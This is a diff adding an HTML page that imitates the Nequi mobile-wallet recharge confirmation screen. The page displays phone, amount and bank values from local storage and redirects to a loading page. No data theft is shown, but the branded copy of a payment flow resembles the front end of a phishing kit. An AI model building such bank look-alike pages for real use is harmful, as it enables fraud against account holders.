@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Revisa la info</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+<div class="container">
+
+    <img src="logo.svg" class="logo" alt="Nequi">
+    <h2 class="title">Revisa la info</h2>
+
+    <div class="card">
+
+        <p class="label">Concepto</p>
+        <p>Recarga Nequi PSE</p>
+
+        <p class="label">Número de celular</p>
+        <p id="telefono"></p>
+
+        <p class="label">¿Cuánto?</p>
+        <p id="monto"></p>
+
+        <p class="label">Tipo de persona</p>
+        <p id="persona"></p>
+
+        <p class="label">Banco</p>
+        <p id="banco"></p>
+
+    </div>
+
+    <button class="btn active" id="recargarBtn">Recargar</button>
+    <button class="btn-outline" onclick="history.back()">Atrás</button>
+
+</div>
+
+<script>
+// cargar datos
+document.getElementById("telefono").innerText = localStorage.getItem("telefono");
+document.getElementById("monto").innerText = "$ " + localStorage.getItem("monto");
+document.getElementById("persona").innerText = localStorage.getItem("persona");
+document.getElementById("banco").innerText = localStorage.getItem("banco");
+
+
+function formatear(num) {
+    return num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+}
+
+let monto = localStorage.getItem("monto");
+document.getElementById("monto").innerText = "$ " + formatear(monto);
+</script>
+
+<script>
+document.getElementById("recargarBtn").addEventListener("click", () => {
+    window.location.href = "loading.html";
+});
+</script>
+</body>
+</html>
